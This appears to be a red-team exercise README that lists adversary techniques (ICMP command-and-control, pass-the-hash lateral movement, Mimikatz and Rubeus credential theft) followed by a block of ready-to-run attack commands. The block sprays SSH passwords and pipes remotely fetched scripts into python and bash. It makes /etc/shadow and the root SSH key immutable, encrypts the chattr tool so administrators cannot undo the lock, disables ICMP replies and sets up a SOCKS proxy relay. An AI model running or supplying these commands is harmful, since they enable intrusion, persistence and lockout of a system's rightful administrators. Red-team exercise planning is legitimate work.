# CS2020 repository

#### MSEL concepts:
##### Authenticated C2 via ICMP on Linux and Windows
##### Fallback channels using hardcoded IPs and calculated subnets
##### Proxied lateral movement using PTT/PTH via WMI, RPC/DCOM, SMB, and WinRM 
##### Defense evasion using in-memory payloads, encryption, timestamp modification, and byte randomization
##### Credential access using Mimikittenz, Mimikatz, Minidump, Rubeus, and InternalMonologue
##### Privilege escalation using process injection, parent process spoofing, and token theft

###### DMZ
```txt
# local
spraySSH <TARGET> <USERDICTIONARY> <PASSWORDDICTIONARY>

# remote
nohup curl --insecure -sv https://<IP>/http_basic_server.py|python - & disown
nohup curl --insecure -sv https://<IP>/python_proxy_server.py|python - & disown
curl --insecure https://<IP>/icmp_basic_server -o icmp_basic_server && chmod +x icmp_basic_server

# passwd root 
chattr +i /etc/shadow
chattr +i /root/.ssh/id_rsa
openssl enc -aes-256-cbc -salt -pbkdf2 -in chattr -out chattr.tmp -k <PASSWORD> & mv chattr.tmp chattr;

curl --insecure -sv https://<IP>/redghost.sh| bash -
sysctl -w net.ipv4.icmp_echo_ignore_all=1

# proxychains.conf
localnet 127.0.0.0/255.0.0.0
socks4 <IP> <PORT> <PASSWORD>

```
